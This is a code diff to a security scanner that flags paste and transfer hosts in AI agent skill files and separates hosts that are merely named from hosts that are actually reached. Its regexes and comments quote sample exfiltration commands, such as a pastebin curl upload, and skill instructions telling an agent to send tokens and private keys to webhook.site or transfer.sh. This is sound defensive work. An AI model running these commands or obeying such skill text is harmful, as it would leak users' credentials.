@@ -92,6 +92,7 @@ from ._content import (
     _in_fence,
     _is_code_example,
     _negation_governs_trigger,
+    _pos_in_source_code_section,
     _skill_declared_tools,
     _skill_own_host,
     _squat_hits,
@@ -161,12 +162,16 @@ from ._lifecycle import (
 # CRITICAL: unambiguous malware signals (paste-staged payloads, credential/wallet theft,
 # and the ClawHavoc password-dialog social-engineering trick).
 _SKILL_CRIT = [
-    (
-        # C-211: moved to checks/_shared.py as _KNOWN_EXFIL_HOST_RE (verbatim) so B166
-        # (checks/_mcp.py) can reuse the exact same host set against MCP server args.
-        "paste / exfiltration host",
-        _KNOWN_EXFIL_HOST_RE,
-    ),
+    # B-555: "paste / exfiltration host" USED TO BE THE FIRST ENTRY HERE. It is now
+    # resolved by `_exfil_host_hits` below, because a bare MENTION of a transfer host in
+    # prose is not the same act as REACHING one, and only the second deserves a
+    # DO-NOT-INSTALL FAIL. The split had to leave this list rather than stay in it: every
+    # entry here is unconditionally CRITICAL once it escapes `_is_code_example`, and that
+    # is exactly the property being retired for this one label. Its call site sits
+    # IMMEDIATELY BEFORE this loop so a convicting match still lands FIRST in `crit` and
+    # the rendered evidence order is byte-identical to before the split.
+    # (C-211 note, preserved: the host set itself lives in checks/_shared.py as
+    # _KNOWN_EXFIL_HOST_RE so B166 in checks/_mcp.py can reuse it against MCP server args.)
     (
         "known stealer malware name",
         re.compile(r"\b(AMOS|Atomic\s*Stealer|RedLine\s*Stealer|Lumma\s*Stealer)\b", re.I),
@@ -316,6 +321,210 @@ def _notify_host_hits(
             crit_hits.append(f"secret/file data reaches a Telegram/Discord notify host: {m.group(0)}")
         else:
             warn_hits.append(f"self-notification via Telegram/Discord ({m.group(0)}) — review the payload")
+    return crit_hits, warn_hits
+
+
+# ---------- B-555: naming a paste host vs reaching one ----------
+#
+# `_KNOWN_EXFIL_HOST_RE` merges TWO populations that deserve different verdicts:
+#
+#   (a) DATED IOC RECORDS from iocdb.py — hosts with provenance, published because they
+#       were seen in a real campaign. There is no benign reason for a skill to name one,
+#       so a match stays unconditionally CRITICAL. `_iocdb_is_known_bad_host` is the
+#       same predicate the regex fragments were built from, so the two cannot disagree.
+#
+#   (b) GENERIC DUAL-USE TRANSFER/PASTE HOSTS — transfer.sh, pastebin.com, webhook.site,
+#       0x0.st, file.io, ngrok, ... These are ordinary infrastructure. A support doc that
+#       tells a human "upload the build log to transfer.sh and paste the link in the
+#       issue" names one, uploads nothing, and was being answered with DO-NOT-INSTALL.
+#
+# Reproduced end-to-end through `vet_skill()` before this change: a two-file skill (a
+# Markdown style guide plus a SUPPORT.md whose only payload is a 4-space-indented
+# `curl --upload-file ./build.log https://transfer.sh/build.log`, no executable file
+# anywhere in the skill) returned FAIL/CRITICAL "paste / exfiltration host". Support docs
+# naming a transfer host are common, and DO-NOT-INSTALL is not a nuance an exit code can
+# express.
+#
+# So (b) needs a REACH anchor, and the anchor must not be a signal the skill's author
+# writes for us. That rules out fence/indent-based suppression — the author chooses the
+# formatting, which is precisely the defect B-526 exists to close; solving an FP by
+# widening a suppression the attacker also controls just moves the hole. The three
+# anchors below are all attacker-COSTLY instead: to keep the FAIL band a skill has to
+# actually pipe remote content into a shell, actually put the host in a shipped script,
+# or actually name credential-bearing data next to it.
+_EXFIL_HOST_REMOTE_EXEC_RE = re.compile(
+    # `curl ... | sh`, `| bash`, `| python -`, `$(curl ...)`, `` `wget ...` ``
+    r"\|\s*(?:sudo\s+)?(?:ba|z|k|da|c)?sh\b"
+    r"|\|\s*(?:python3?|perl|ruby|node)\b"
+    r"|[$`]\(?\s*(?:curl|wget|fetch)\b"
+    r"|\b(?:eval|source)\s+[^\n]{0,40}(?:curl|wget|https?:)",
+    re.I,
+)
+
+# A TRANSFER COMMAND aimed at the host — the second half of "reached", and the reason the
+# first draft of this gate was narrowed.
+#
+# THIS IS WHERE B-555's HEADLINE CASE STOPS. The ticket's benign example is
+# `curl --upload-file ./build.log https://transfer.sh/build.log` sitting in a SUPPORT.md,
+# and the shape a real attacker uses is
+# `curl -F 'api_paste_code=@data.txt' https://pastebin.com/api/api_post.php`
+# (pinned CRITICAL by tests/test_b132_b13_fp_fixes.py). Those two are the SAME STATIC
+# SHAPE: one command, one local file, one paste host, one upload flag. Everything that
+# separates them lives in who the sentence is addressed to and why — not in anything a
+# regex can read. Measured, not assumed: the first version of this gate omitted transfer
+# commands, and it turned that pinned malicious upload into a WARN. Trading a real
+# false negative for a benign one is not a fix, so the FAIL band keeps BOTH.
+#
+# What this gate does close is the case the same measurement showed is the only one that
+# occurs in the wild: a paste host NAMED in documentation prose with no command anywhere
+# near it. Swept across 713 real skill documents on a live machine, every unfenced match
+# was of that kind (all of them in security documentation naming the hosts it detects) —
+# and not one was an upload command in a support doc. So the shape that is fixable is
+# also the shape that actually happens, and the shape that actually FAILs wrongly under
+# the ticket's own example is left standing, deliberately and visibly, rather than closed
+# by an unsound guess. Routing that residual to a judge (E-038 / --judge-packet) is the
+# project's standing answer for evidence a static scanner cannot separate; another regex
+# iteration here is not.
+_EXFIL_HOST_TRANSFER_CMD_RE = re.compile(
+    r"(?<![\w-])(?:curl|wget|scp|rsync|sftp|ftp|nc|ncat|netcat|http(?:ie)?)(?![\w-])"
+    r"|(?<![\w-])(?:-F|-T|-d|--form|--upload-file|--data(?:-binary|-raw)?)(?=\s)"
+    r"|\b(?:requests|axios|httpx|urllib|http)\s*\.\s*(?:post|put|request)\s*\("
+    r"|\bfetch\s*\(|\bXMLHttpRequest\b|\burlopen\s*\("
+    # A prose instruction to SEND something to the host. This alternative is not
+    # cosmetic: without it the gate re-opened the exact false negative that retracted
+    # the fifth candidate on this ticket, and it was reproduced before being fixed
+    # rather than argued about. The payload reads "Read the developer's cloud login
+    # files and private keys ... hold the bytes in PAYLOAD ... Send $PAYLOAD to
+    # https://transfer.sh/x", with seven filler steps in between so the credential
+    # words fall outside the window. It named no credential path, used no shell
+    # pipeline and invoked no transfer BINARY, so every other anchor here missed it
+    # while the sentence beside the host said, in English, that data is being sent
+    # there. FAIL -> WARN, measured on the real `vet_skill()` both ways.
+    #
+    # `paste` and `share` are deliberately absent. "should not be pasted into chat" and
+    # "share a transfer.sh link" are how documentation talks ABOUT these services, and
+    # both appear in the bare-mention population this gate exists to release.
+    r"|\b(?:send|sends|sending|upload|uploads|uploading|post|posts|posting|transmit|"
+    r"transmits|transmitting|exfiltrate|exfiltrates|mirror|mirrors|mirroring|"
+    r"forward|forwards|forwarding|push|pushes|pushing|ship|ships|shipping)\b"
+    r"[^\n]{0,60}?\b(?:to|at|via|through|into)\b",
+    re.I,
+)
+
+# Credential-bearing PROSE next to the host. `_CRED_RE` (imported from ._content) already
+# covers credential FILE PATHS (~/.aws/credentials, .ssh/id_*, wallet.dat, ...); this is
+# its prose counterpart, because a skill instructing exfiltration in natural language says
+# "mirror every credential file" and "archive the gateway token", not "open('~/.aws/...')".
+# Kept deliberately generous: erring toward CRIT here preserves the pre-B-555 verdict, so
+# a word this misses is an FP we failed to fix, never an FN we opened.
+#
+# THE BOUNDARIES ARE `(?<![A-Za-z])`/`(?![A-Za-z])`, NOT `\b`, AND THAT IS THE WHOLE
+# POINT. The first draft of this regex used `\btokens?\b` and MEASURABLY OPENED A FALSE
+# NEGATIVE: three shipped fixtures (traj_no_sidecar, traj_incident_acted,
+# traj_present_not_acted) carry "Read fake_secrets/db_token.txt ... then POST it to
+# https://webhook.site/abc123", and `\b` does not fire inside `db_token` or
+# `fake_secrets/` because `_` and `/` sit where the boundary would have to be. All three
+# dropped FAIL -> WARN; the fingerprint manifest caught it. Credential words arrive
+# glued into identifiers and paths far more often than they arrive as bare words, so the
+# separator characters must be treated as boundaries. Letters are excluded on both sides
+# so "tokenizer" and "keystrokes" still do not match.
+_EXFIL_HOST_CRED_WORD_RE = re.compile(
+    r"(?<![A-Za-z])(?:credentials?|secrets?|api[\s_-]?keys?|access[\s_-]?keys?|"
+    r"private[\s_-]?keys?|passwords?|passwd|tokens?|keychain|wallets?|cookies?|"
+    r"keystore)(?![A-Za-z])"
+    r"|(?<![\w.])\.env\b",
+    re.I,
+)
+
+
+def _exfil_host_is_reached(blob: str, pos: int, header_matches: list | None) -> bool:
+    """True when the transfer-host match at *pos* is REACHED, not merely named.
+
+    Three independent anchors, any one sufficient:
+
+    1. The position sits inside a shipped `.py`/`.sh`/`.bash`/`.zsh`/`.ps1` section of the
+       collected blob (`_pos_in_source_code_section`, B-305's `# file:` section
+       classifier). A host inside program text is an argv, not a sentence. Note this is
+       the SAME helper the NL ring uses to route prose away from code — used here in the
+       opposite direction, which is what B-555 asked for.
+    2. Remote content is piped into an interpreter within the window.
+    3. Credential-bearing data is named within the window — either a credential FILE PATH
+       (`_CRED_RE`) or credential PROSE (`_EXFIL_HOST_CRED_WORD_RE`).
+
+    The window is `_notify_host_window`'s, reused rather than re-derived: B-122 already
+    argued that ±200 chars is wide enough to catch string-building on one request and
+    narrow enough that an unrelated credential mention elsewhere in the skill does not
+    fire the discriminator. The same reasoning applies unchanged here.
+    """
+    if _pos_in_source_code_section(blob, pos, header_matches):
+        return True
+    window = _notify_host_window(blob, pos)
+    return bool(
+        _EXFIL_HOST_REMOTE_EXEC_RE.search(window)
+        or _EXFIL_HOST_TRANSFER_CMD_RE.search(window)
+        or _CRED_RE.search(window)
+        or _EXFIL_HOST_CRED_WORD_RE.search(window)
+    )
+
+
+def _exfil_host_hits(
+    name: str,
+    blob: str,
+    fence_ranges: list,
+    coverage: list | None = None,
+    crit_hosts: set | None = None,
+    warn_hosts: set | None = None,
+) -> tuple[list, list]:
+    """Split paste/transfer-host matches into (crit_hits, warn_hits) — see the block
+    comment above for why the split exists.
+
+    Mirrors `_notify_host_hits`' contract deliberately: same (crit, warn) arity, same
+    optional append-only *coverage* sink that may never join the verdict tuple, same
+    optional host set for the judge packet. B-122 solved the identical problem for
+    Telegram/Discord — a dual-use host whose mere presence was being read as malice — and
+    down-ranking rather than dropping is what it settled on; there is no reason for this
+    label to invent a second shape.
+
+    A CRIT short-circuits and discards the warn list: once the skill is convicted, a
+    down-ranked mention elsewhere in the same file has nothing left to add.
+    """
+    crit_hits: list = []
+    warn_hits: list = []
+    seen_warn: set = set()
+    fenced_only = False
+    header_matches = None
+    for m in _KNOWN_EXFIL_HOST_RE.finditer(blob):
+        if _is_code_example(blob, m.start(), fence_ranges):
+            # B-526: a bare fence discloses instead of dropping — same as the
+            # _SKILL_CRIT loop this branch was lifted out of, note text unchanged.
+            if not fenced_only and _fence_only_suppression(blob, m.start(), fence_ranges):
+                fenced_only = True
+            continue
+        if header_matches is None:
+            header_matches = list(_MANIFEST_HEADER_RE.finditer(blob))
+        host = m.group(0)
+        if _iocdb_is_known_bad_host(host) or _exfil_host_is_reached(
+            blob, m.start(), header_matches
+        ):
+            if crit_hosts is not None:
+                crit_hosts.add(host)
+            # Wording unchanged from the retired _SKILL_CRIT entry so the rendered
+            # `crit` evidence — and the finding fingerprint derived from it — is
+            # byte-identical for every skill that still convicts.
+            return ["paste / exfiltration host"], []
+        if host.lower() in seen_warn:
+            continue
+        seen_warn.add(host.lower())
+        if warn_hosts is not None:
+            warn_hosts.add(host)
+        warn_hits.append(
+            f"names the paste/transfer host {host} with nothing reaching it"
+        )
+    if not crit_hits and fenced_only and coverage is not None:
+        coverage.append(
+            f"coverage: {name}: paste / exfiltration host sits in a fence carrying no"
+            " marker we recognise, so it was not assessed"
+        )
     return crit_hits, warn_hits
 
 
@@ -3441,6 +3650,7 @@ _B13_WINNER_SUBSIGNAL = {
     "warns_js": "dynamic JS/TS execution surface",
     "warns_content": "content signals worth a review",
     "warns_notify_host": "notification-host usage worth a review",
+    "warns_named_exfil_host": "paste/transfer host named, with nothing reaching it",
     "persist_warn": "possible persistence/daemonize pattern",
     "warns_local_exfil": "possible local-sink secret exposure",
     "warns_unpinned": "unpinned dependencies",
@@ -3643,6 +3853,10 @@ def check_installed_skills(ctx: Context) -> Finding:
     # without ever winning a verdict or corroborating another bucket's WARN.
     h6_advisory: list[str] = []
     warns_notify_host: list[str] = []  # B-122: bare Telegram/Discord self-notify (no taint)
+    # B-555: a paste/transfer host NAMED in prose with no executable reach and no
+    # credential data beside it — the down-ranked half of the retired _SKILL_CRIT
+    # entry. Same band and same reasoning as warns_notify_host above.
+    warns_named_exfil_host: list[str] = []
     # B-526: fence COVERAGE notes — "a match sat in a fence carrying no marker we
     # recognise, so it was not assessed". Deliberately NOT one of the verdict buckets
     # above and never read by the `if <bucket>: return` cascade below. An independent
@@ -3684,6 +3898,8 @@ def check_installed_skills(ctx: Context) -> Finding:
     # installed skill but carries a single `target`, so with two contributors there is
     # no answer to "whose destination is this?" that is not a guess.
     notify_hosts_by_skill: dict = {}
+    # B-555: same shape, for the down-ranked paste/transfer-host WARN.
+    named_exfil_hosts_by_skill: dict = {}
     install_hosts_by_skill: dict = {}
     # B-618: the set of skills that contributed ANY evidence to `crit` /
     # `warns_install_curl` / `warns_notify_host` respectively — not just the ones that
@@ -3703,14 +3919,33 @@ def check_installed_skills(ctx: Context) -> Finding:
     crit_skills: set = set()
     install_curl_skills: set = set()
     notify_skills: set = set()
+    named_exfil_skills: set = set()
     for name, blob in skills.items():
         _crit_len0 = len(crit)
         _install_curl_len0 = len(warns_install_curl)
         _notify_len0 = len(warns_notify_host)
+        _named_exfil_len0 = len(warns_named_exfil_host)
         # C-041: precompute fence ranges once per blob so every check below can
         # skip matches that are purely inside a documented code example.
         _fr = _fence_ranges(blob)
         _own_host = _skill_own_host(blob, _fr)  # F-097: skill's own declared homepage host
+
+        # B-555: resolved BEFORE the loop below because this label used to be
+        # _SKILL_CRIT[0] — running it first keeps a convicting match in the same
+        # position in `crit`, so no existing finding's rendered text moves.
+        _exfil_crit_hosts: set = set()
+        _exfil_warn_hosts: set = set()
+        _exfil_crit, _exfil_warn = _exfil_host_hits(
+            name, blob, _fr, coverage_fence, _exfil_crit_hosts, _exfil_warn_hosts
+        )
+        for _h in _exfil_crit:
+            crit.append(f"{name}: {_h}")
+        if _exfil_crit_hosts:
+            crit_hosts_by_skill.setdefault(name, set()).update(_exfil_crit_hosts)
+        for _h in _exfil_warn:
+            warns_named_exfil_host.append(f"{name}: {_h}")
+        if _exfil_warn_hosts:
+            named_exfil_hosts_by_skill.setdefault(name, set()).update(_exfil_warn_hosts)
 
         # CRIT patterns: iterate all matches; drop those that are code examples.
         for label, rx in _SKILL_CRIT:
@@ -4329,6 +4564,8 @@ def check_installed_skills(ctx: Context) -> Finding:
             install_curl_skills.add(name)
         if len(warns_notify_host) > _notify_len0:
             notify_skills.add(name)
+        if len(warns_named_exfil_host) > _named_exfil_len0:
+            named_exfil_skills.add(name)
     # C-044: unpinned dependency scan — collect across all skills; WARN severity.
     # Runs after the main CRIT/HIGH loop to avoid polluting the main evidence lists.
     warns_unpinned: list[str] = []
@@ -4376,6 +4613,7 @@ def check_installed_skills(ctx: Context) -> Finding:
         "warns_js": warns_js,
         "warns_content": warns_content,
         "warns_notify_host": warns_notify_host,
+        "warns_named_exfil_host": warns_named_exfil_host,
         "persist_warn": _persist_warn,
         "warns_local_exfil": warns_local_exfil,
         "warns_unpinned": warns_unpinned,
@@ -4786,6 +5024,36 @@ def check_installed_skills(ctx: Context) -> Finding:
             warns_content,
             _signal_buckets,
             "warns_content",
+        )
+
+    # B-555: a paste/transfer host the skill only NAMES — no interpreter fed from it,
+    # no credential data beside it, and not inside a shipped script. Ranked directly
+    # above its B-122 sibling because naming an upload endpoint is the marginally
+    # stronger prompt than naming a chat webhook; both are dual-use, neither convicts.
+    if warns_named_exfil_host:
+        extra = (
+            f" (+{len(warns_named_exfil_host) - 6} more)"
+            if len(warns_named_exfil_host) > 6
+            else ""
+        )
+        return _b13_verdict(
+            HIGH,
+            WARN,
+            "Paste/transfer host named in installed skill(s), with nothing reaching "
+            "it: "
+            + "; ".join(warns_named_exfil_host[:6])
+            + extra,
+            "The skill names a file-transfer or paste service but no credential data "
+            "sits beside it, nothing pipes it into a shell, and it is not inside a "
+            "bundled script — which is what a support doc telling a human where to "
+            "upload a log looks like. Read the surrounding text and confirm it is "
+            "instructions for you, not an upload the skill performs by itself.",
+            warns_named_exfil_host,
+            _signal_buckets,
+            "warns_named_exfil_host",
+            destination_hosts=_sole_contributor(
+                named_exfil_hosts_by_skill, named_exfil_skills
+            ),
         )
 
     # B-122: bare Telegram/Discord self-notification (no secret/file taint reaching the
